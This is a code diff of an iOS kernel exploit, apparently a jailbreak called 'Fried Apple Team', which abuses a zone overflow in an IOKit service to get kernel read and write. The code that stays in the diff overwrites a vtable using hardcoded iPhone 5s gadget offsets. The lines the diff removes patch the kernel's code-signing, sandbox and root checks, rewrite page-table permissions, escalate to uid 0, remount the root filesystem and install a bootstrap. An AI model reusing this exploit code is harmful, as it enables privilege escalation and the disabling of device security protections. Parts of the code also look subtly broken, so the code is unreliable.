@@ -10,8 +10,6 @@
 #include <spawn.h>
 extern char **environ;
 
-//#include "patchfinder_64.h"
-
 #pragma mark -
 #pragma mark IOKit
 
@@ -62,12 +60,6 @@ extern "C" {
 	kern_return_t IOServiceWaitQuiet( io_service_t service, mach_timespec_t *waitTime );
 	kern_return_t IOServiceClose( io_connect_t connect );
 }
-
-#if __LP64__
-	#define UNTETHER_FULL
-#else
-	#define	UNTETHER_AMFI
-#endif
 
 #define WaitForLog() { usleep(10 * 1000); }
 #define UTZLog(format, ...) { NSLog(format, ##__VA_ARGS__); WaitForLog(); }
@@ -855,23 +847,7 @@ struct PatchFinder
 	{
 		// !!! PATCHFINDER CODE IS NOT AVAILABLE FOR PUBLIC !!!
 
-//		INVALIDATE_TLB	= find_invalidate_tlb_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		FLUSHCACHE		= find_flush_dcache_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		
-//		MOUNT_COMMON	= find_mount_common_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		CS_ENFORCE		= find_cs_enforcement_disable_amfi_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		VM_MAP_ENTER	= find_vm_map_enter_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		VM_MAP_PROTECT	= find_vm_map_protect_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		TFP0			= find_tfp0_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		GET_R00T		= find_setreuid_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		ICHDB_1			= find_i_can_has_debugger_1_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		ICHDB_1			= find_i_can_has_debugger_2_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		PROC_ENFORCE	= find_proc_enforce_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		MAPIO			= find_lwvm_mapio_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-//		SB_TRACE		= find_sb_backtrace_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
-		
 		// These are hardcoded offsets for iPhone 5s
-
 		// gadgets
 		ADD_X0_232				= m_kernelBase + m_kaslrSlide + 0x0F586C;
 		LDR_X0_X8_W1_SXTW_2		= m_kernelBase + m_kaslrSlide + 0x3834C8;
@@ -1074,9 +1050,6 @@ int main(int argc, char** argv)
 	// start pulling CPU resources (context switching) to our application
 	cpuExerciser.start();
 
-#if defined(UNTETHER_FULL)
-	UTZLog(@"[INF:UTZ] untether64 ppid: %5d", pp);
-#endif
 
 	uint32_t count = 5;
 	
@@ -1098,7 +1071,6 @@ int main(int argc, char** argv)
 	// adjacent elements are found
 	if (count != 0)
 	{
-	#if defined(UNTETHER_AMFI)
 		UTZLog(@"[INF:UTZ] ------------======== Fried Apple Team ========------------");
 		UTZLog(@"[INF:UTZ] ----                   smokin killz                   ----");
 		UTZLog(@"[INF:UTZ] --                                                      --");
@@ -1111,7 +1083,6 @@ int main(int argc, char** argv)
 		UTZLog(@"[INF:UTZ] --                     ppid: %5d                      --", pp);
 		UTZLog(@"[INF:UTZ] ----                                                  ----");
 		WaitForLog();
-	#endif
 
 		static const uint32_t kTargetZoneOriginal		= 1024;
 		static const uint32_t kTargetZoneParentPoisoned = 2048;
@@ -1167,25 +1138,15 @@ int main(int argc, char** argv)
 		
 		// DUMP KERNEL HERE IF YOU HAVE PATCHFINDER
 		kernelDump = (uint8_t*)malloc(0x10000 * 256);
-	#if defined(UNTETHER_AMFI)
 		kernelDumper.init(&kernelReader, kaslr_slide, true);
 		kernelDumper.init(&kernelReader, kaslr_slide);
 		kernelDumper.dumpKernel(kernelDump, 0x10000 * 256);
-//	#else
-//		FILE* file = fopen("/var/mobile/Media/kernel.dump", "r");
-//		fread(kernelDump, 1, 0x10000 * 256, file);
-//		fclose(file);
-	#endif
 
 		patchFinder.init(kaslr_slide);
 		patchFinder.findPatchesForKernel(kernelDump);
 		patchFinder.prinfOffsets();
 		
-	#if defined(UNTETHER_AMFI)
 		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X8_W1_SXTW_2;
-	#elif defined(UNTETHER_FULL)
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32;
-	#endif
 
 		// patch index
 		vtdump[kGasGaugeVtable_getExternalTrapForIndex] = patchFinder.ADD_X0_232;
@@ -1203,11 +1164,10 @@ int main(int argc, char** argv)
 		uint32_t overlapSize = kTargetZoneOriginal - kVMMapCopySize + kTargetZoneOriginal;
 		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
 
-	#if defined(UNTETHER_AMFI)
-		// set AMFI_GET_OUT_OF_MY_WAY to 1 (disable code signing verification)
+		/*// set AMFI_GET_OUT_OF_MY_WAY to 1 (disable code signing verification)
 		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.STRB_W1_X8_W2_UXTW;
 		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap5(0x1, patchFinder.AMFI_GET_OUT_OF_MY_WAY - vtdump[147], 0x43434343, 0x44444444, 0x45454545);
+		ggService512.callIndex0Trap5(0x1, patchFinder.AMFI_GET_OUT_OF_MY_WAY - vtdump[147], 0x43434343, 0x44444444, 0x45454545);*/
 		
 		// vertify
 		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X8_W1_SXTW_2;
@@ -1230,280 +1190,6 @@ int main(int argc, char** argv)
 		// AFMI is disabled, ready to spawn actual untether
 		if (cs_flag == 0x1)
 			success = true;
-	#endif
-
-	#if defined(UNTETHER_FULL)
-		
-		#define WriteWhatWhere32(what, where) { \
-			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.STR_W3_X1_W2_UXTW; \
-			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
-			ggService512.callIndex0Trap5((uint64_t)where, 0x0, (uint32_t)what, 0x4444444444444444, 0x4545454545454545); \
-		} \
-
-		#define ReadWhere32(where, out) { \
-			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32; \
-			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
-			out = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
-		} \
-
-		#define ReadWhere64(where, out) { \
-			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32; \
-			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
-			uint32_t* tmp_hi_lo = (uint32_t*)&out; \
-			tmp_hi_lo[0] = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
-			tmp_hi_lo[1] = ggService512.callIndex0Trap5((uint64_t)where + 4 - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
-		} \
-
-		uint64_t pages[50];
-
-		int page_cnt = 0;
-		pages[page_cnt++] = patchFinder.GET_R00T		& (~0xFFF); // 0
-		pages[page_cnt++] = patchFinder.VM_MAP_ENTER	& (~0xFFF); // 1
-		pages[page_cnt++] = patchFinder.VM_MAP_PROTECT	& (~0xFFF); // 2
-		pages[page_cnt++] = patchFinder.MOUNT_COMMON	& (~0xFFF); // 3
-		pages[page_cnt++] = patchFinder.TFP0			& (~0xFFF); // 4
-		pages[page_cnt++] = patchFinder.CS_ENFORCE		& (~0xFFF); // 5
-		pages[page_cnt++] = patchFinder.PROC_ENFORCE	& (~0xFFF); // 6
-		pages[page_cnt++] = patchFinder.ICHDB_1			& (~0xFFF); // 7
-		pages[page_cnt++] = patchFinder.ICHDB_2			& (~0xFFF); // 8
-		pages[page_cnt++] = patchFinder.MAPIO			& (~0xFFF); // 9
-		pages[page_cnt++] = patchFinder.SB_TRACE		& (~0xFFF); // 10
-
-		// work with memory pages
-		// get PDE
-		uint64_t pmap_store, pde_base;
-		ReadWhere64(patchFinder.KERNEL_PMAP, pmap_store);
-		UTZLog(@"[INF:UTZ] pmap_store: 0x%.16llX", pmap_store);
-		ReadWhere64(pmap_store, pde_base);
-		UTZLog(@"[INF:UTZ] pde_base:   0x%.16llX", pde_base);
-		
-		// get Physical and Virtual bases
-		uint64_t gPhysBase, gVirtBase;
-		ReadWhere64(patchFinder.PHYS_ADDR, gPhysBase);
-		UTZLog(@"[INF:UTZ] gPhysBase:  0x%.16llX", gPhysBase);
-		ReadWhere64(patchFinder.PHYS_ADDR - 8, gVirtBase);
-		UTZLog(@"[INF:UTZ] gVirtBase:  0x%.16llX", gVirtBase);
-
-		// thanks @PanguTeam
-		
-		const uint64_t addr_start = 0xffffff8000000000; // Analytical kernel page table starting address (25 bits to 1, TTBR1_EL1 setting)
-		// Up to 3 levels mapping. For 4KB page granule Level1 describes mapping of 1Gb, Level2 - 2Mb
-		// First, read the value of stage1
-		uint64_t level1_data = 0;
-		
-		// get Level1 entry
-		ReadWhere64(pde_base, level1_data);
-		
-		// read level2 (each corresponds to 2Mb)
-		uint64_t level2_base = (level1_data & 0xfffffff000) - gPhysBase + gVirtBase;
-		uint64_t level2_krnl = level2_base + (((0xffffff8002002000 + kaslr_slide - addr_start) >> 21) << 3);
-		
-		// placeholder for 30Mb (15 Level2 entries)
-		uint64_t level2_data[15] = {0};
-		UTZLog(@"[INF:UTZ] level2_base 0x%.16llX level2_krnl 0x%.16llX", level2_base, level2_krnl);
-		
-		// read 16 Level2 entries (30Mb)
-		for (int i = 0; i < 15; i++) {
-			ReadWhere64(level2_krnl+(i*8), level2_data[i]);
-			UTZLog(@"[INF:UTZ] level2_data[%2d] = 0x%.16llX", i, level2_data[i]);
-		}
-		
-		static const uint64_t kPageDescriptorType_Mask			= 0b11;
-		static const uint64_t kPageDescriptorType_Invalid		= 0b00;
-		static const uint64_t kPageDescriptorType_Block			= 0b01;
-		static const uint64_t kPageDescriptorType_Table			= 0b11;
-		
-		static const uint64_t kPageDescriptorAP_Mask			= 0b11000000;
-		static const uint64_t kPageDescriptorAP_Shift			= 6;
-		static const uint64_t kPageDescriptorAP_EL1_RW_EL0_N	= 0b00;
-		static const uint64_t kPageDescriptorAP_EL1_RW_EL0_RW	= 0b01;
-		static const uint64_t kPageDescriptorAP_EL1_RO_EL0_N	= 0b10;
-		static const uint64_t kPageDescriptorAP_EL1_RO_EL0_RO	= 0b11;
-		
-		struct PagePatches {
-			uint64_t address;
-			uint64_t data;
-		} pages_patches[50] = {0};
-		uint32_t pages_patch_cnt = 0;
-		
-		auto alreadyPatched = [&pages_patches, &pages_patch_cnt](uint64_t address) -> bool {
-			for (uint32_t i=0; i < pages_patch_cnt; i++)
-			{
-				if (pages_patches[i].address == address)
-					return true;
-			}
-			return false;
-		};
-		
-		// Rewritten page table
-		for (int i = 0; i < page_cnt; i++)
-		{
-			uint64_t rw_page_base = pages[i];
-			
-			// First check level2 corresponds to the table
-			int idx = (int)(((rw_page_base - addr_start) >> 21) - (((0xffffff8002002000 + kaslr_slide) - addr_start) >> 21));
-
-			uint64_t level2_entry = level2_data[idx];
-
-			// Handle L2 'block' descriptors
-			if ((level2_entry & kPageDescriptorType_Mask) != kPageDescriptorType_Table)
-			{
-				if ((level2_entry & kPageDescriptorType_Mask) != kPageDescriptorType_Block) {
-					NSLog(@"[ERR:UTZ] pages[%2d:%.16llX] -> L1[%2d:%.16llX] invalid L2 entry found", i, rw_page_base, idx, level2_entry);
-					continue;
-				}
-
-				// Patch L2 descriptors
-				if (((level2_entry & kPageDescriptorAP_Mask) >> kPageDescriptorAP_Shift) != kPageDescriptorAP_EL1_RW_EL0_N)
-				{
-					uint64_t level2_addr = level2_krnl+(idx*8);
-					if (alreadyPatched(level2_addr) == true)
-						continue;
-
-					pages_patches[pages_patch_cnt].address = level2_addr;
-					pages_patches[pages_patch_cnt].data = level2_entry;
-					
-					// clean AP bits
-					level2_entry &= ~kPageDescriptorAP_Mask;
-	
-					// set AP: EL1 to RW, EL0 to None (value is actaully 0b00, code is just for readability)
-					// level2_entry |= (kPageDescriptorAP_EL1_RW_EL0_N << kPageDescriptorAP_Shift) & kPageDescriptorAP_Mask
-	
-					// 32bit write is enough to covering lower attributes
-					WriteWhatWhere32(level2_entry, level2_addr);
-					
-					UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L2[0x%.16llX] patch %.16llX -> %.16llX", i, rw_page_base, level2_addr, pages_patches[pages_patch_cnt].data, level2_entry);
-					pages_patch_cnt++;
-					
-					continue;
-				}
-				else
-				{
-					UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L3[0x%.16llX] skip %.16llX", i, rw_page_base, level2_krnl+(idx*8), level2_entry);
-				}
-			}
-			
-			// Handle L2 'table' descriptors
-			
-			// Level3, each corresponding to a 4K page
-			uint64_t level3_base = (level2_entry & 0xfffffff000) - gPhysBase + gVirtBase;
-			uint64_t level3_krnl = level3_base + (((rw_page_base & 0x1fffff) >> 12) << 3);
-			
-			// UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L2[%d] = L2: 0x%.16llX, level3_base: 0x%.16llX, pte_krnl: 0x%.16llX", i, rw_page_base, idx, level2_entry, level3_base, level3_krnl);
-			
-			// read pte
-			uint64_t level3_entry = 0;
-			ReadWhere64(level3_krnl, level3_entry);
-			
-			// Patch L3 descriptors
-			if (((level3_entry & kPageDescriptorAP_Mask) >> kPageDescriptorAP_Shift) != kPageDescriptorAP_EL1_RW_EL0_N)
-			{
-				if (alreadyPatched(level3_krnl) == true)
-					continue;
-
-				pages_patches[pages_patch_cnt].address = level3_krnl;
-				pages_patches[pages_patch_cnt].data = level3_entry;
-				
-				// clean AP bits
-				level3_entry &= ~kPageDescriptorAP_Mask;
-				
-				// set AP: EL1 to RW, EL0 to None (value is actaully 0b00, code is just for readability)
-				// level3_data |= (kPageDescriptorAP_EL1_RW_EL0_N << kPageDescriptorAP_Shift) & kPageDescriptorAP_Mask
-
-				// 32bit write is enough to covering lower attributes
-				WriteWhatWhere32( (uint32_t)level3_entry, level3_krnl);
-				UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L3[0x%.16llX] patch %.16llX -> %.16llX", i, rw_page_base, level3_krnl, pages_patches[pages_patch_cnt].data, level3_entry);
-				pages_patch_cnt++;
-			}
-			else
-			{
-				UTZLog(@"[INF:UTZ] pages[%2d:%.16llX] -> L3[0x%.16llX] skip %.16llX", i, rw_page_base, level3_krnl, level3_entry);
-			}
-		}
-		
-		// Invalidate TLB
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.INVALIDATE_TLB;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
-		
-		// Flush cache
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
-		
-		uint32_t kv = 0;
-		
-		ReadWhere32(patchFinder.VM_MAP_ENTER, kv);
-		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
-		ReadWhere32(patchFinder.TFP0, kv);
-		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
-		
-		UTZLog(@"[INF:UTZ] Patching kernel...");
-		WriteWhatWhere32(0xD503201F, patchFinder.GET_R00T);
-		WriteWhatWhere32(0xD503201F, patchFinder.VM_MAP_PROTECT);
-		WriteWhatWhere32(0xF10003DF, patchFinder.VM_MAP_ENTER);
-		WriteWhatWhere32(0xD503201F, patchFinder.TFP0);
-		WriteWhatWhere32(0xD503201F, patchFinder.MOUNT_COMMON);
-		WriteWhatWhere32(0xD503201F, patchFinder.SB_TRACE);
-		WriteWhatWhere32(0x14000005, patchFinder.MAPIO);
-		WriteWhatWhere32(0x1, patchFinder.CS_ENFORCE);
-		WriteWhatWhere32(0x1, patchFinder.ICHDB_1);
-		WriteWhatWhere32(0x1, patchFinder.ICHDB_2);
-		WriteWhatWhere32(0x0, patchFinder.PROC_ENFORCE);
-		UTZLog(@"[INF:UTZ] ... done");
-		
-		ReadWhere32(patchFinder.VM_MAP_ENTER, kv);
-		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
-		ReadWhere32(patchFinder.TFP0, kv);
-		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
-		
-		// Flush cache
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
-
-		UTZLog(@"[INF:UTZ] revert patched page descriptors (%d)", pages_patch_cnt);
-		for (uint32_t i=0; i < pages_patch_cnt ; i--)
-		{
-			// 32bit write is enough to covering lower attributes
-			WriteWhatWhere32( (uint32_t)pages_patches[i].data, pages_patches[i].address);
-			UTZLog(@"[INF:UTZ] L3[0x%.16llX] revert to %.16llX", pages_patches[i].address, pages_patches[i].data);
-		}
-		
-		// Invalidate TLB
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.INVALIDATE_TLB;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
-
-		// Flush cache
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
-
-		NSLog(@"[INF:UTZ] uid: %d", getuid());
-		
-		setreuid(0, 0);
-		setuid(0);
-		
-		NSLog(@"[INF:UTZ] uid: %d", getuid());
-		
-		// revert vtable pointer
-		memcpy(&vtdump[childOffset], &child[0], kTargetZoneOriginal);
-		
-		// overwrite parent data (w/o header) + entire child blob
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		
-		ggService512.close();
-		ggService512.wait();
-		
-		UTZLog(@"[INF:UTZ] depoison zone.512");
-		kernelReader.replaceObjectWithChild(kTargetZoneChildPoisoned, [&ggService512] () {
-			ggService512.close();
-			ggService512.wait();
-		});
-		
-		success = true;
-	#endif
 	}
 	
 bail:
@@ -1519,105 +1205,6 @@ bail:
 	
 	if (kernelDump)
 		free(kernelDump);
-	
-#if defined(UNTETHER_AMFI)
-	if (success)
-	{
-		pid_t untether_pid;
-		char *untether_argv[] = {
-			"/var/mobile/Media/untether64",
-			nullptr
-		};
-		
-		int ret = chmod("/var/mobile/Media/untether64", 755);
-		if(ret == 0)
-		{
-			UTZLog(@"[INF:UTA] chmod untether64...");
-		}
-		else
-		{
-			UTZLog(@"[INF:UTA] chmod() failed %d", ret);
-		}
-		
-		UTZLog(@"[INF:UTA] spawn untether64...");
-		int status = posix_spawn(&untether_pid, "/var/mobile/Media/untether64", nullptr, nullptr, untether_argv, environ);
-		if (status == 0)
-		{
-			UTZLog(@"[INF:UTA] ... done. Wait for %d", untether_pid);
-			if (waitpid(untether_pid, &status, 0) != -1)
-			{
-				UTZLog(@"[INF:UTA] untether64 exited with %d", status);
-			}
-			else
-			{
-				UTZLog(@"[INF:UTA] waitpid error");
-			}
-		}
-		else
-		{
-			UTZLog(@"[INF:UTA] posix_spawn(\"%s\") failed: %s (%d)", untether_argv[0], strerror(status), status);
-		}
-	}
-#endif
-
-#if defined(UNTETHER_FULL)
-	if (success)
-	{
-		char* nm = strdup("/dev/disk0s1s1");
-		int mntr = mount("hfs", "/", 0x10000, &nm);
-		
-		UTZLog(@"[INF:UTZ] Remounting / as read/write %d %s", mntr, strerror(errno));
-		struct stat sb;
-		if (stat("/yalu", &sb) != 0) {
-			UTZLog(@"[INF:UTZ] /yalu not found, dropping myself..");
-			char name[1024];
-			uint32_t sz = 1024;
-			_NSGetExecutablePath(&name[0], &sz);
-			int o = open(name, O_RDONLY);
-			int f = open("/yalu", O_RDWR|O_CREAT|O_TRUNC);
-			int r = fcopyfile(o, f, 0, COPYFILE_ALL);
-			UTZLog(@"[INF:UTZ] %d %d %d", o, f, r);
-			if (stat("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", &sb) == 0) {
-				chmod("/var/mobile/Media/PhotoData/KimJongCracks/tar", 0777);
-				
-				UTZLog(@"[INF:UTZ] Installing loader.");
-				chdir("/");
-				
-				UTZLog(@"[INF:UTZ] Beginning extraction.");
-				int f = fork();
-				if (f == 0) {
-					execl("/var/mobile/Media/PhotoData/KimJongCracks/tar", "tar", "xvf", "/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", 0);
-					exit(0);
-				}
-				waitpid(f, 0, 0);
-				
-				UTZLog(@"[INF:UTZ] Done extracting.");
-				/*
-				 this fucks shit up without an untether
-				 f = fork();
-				 if (f == 0) {
-				 execl("/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", 0);
-				 exit(0);
-				 }
-				 waitpid(f, 0, 0);
-				 */
-				f = fork();
-				if (f == 0) {
-					setreuid(501,501);
-					execl("/usr/bin/uicache", "uicache", 0);
-					exit(0);
-				}
-				waitpid(f, 0, 0);
-				UTZLog(@"[INF:UTZ] Done installing loader.");
-				
-				unlink("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar");
-				kill(pp, 9);
-			}
-		}
-		
-		UTZLog(@"[INF:UTZ] ALL YOUR BASE ARE BELONG TO US");
-	}
-#endif
 
 	exit(0);
 }
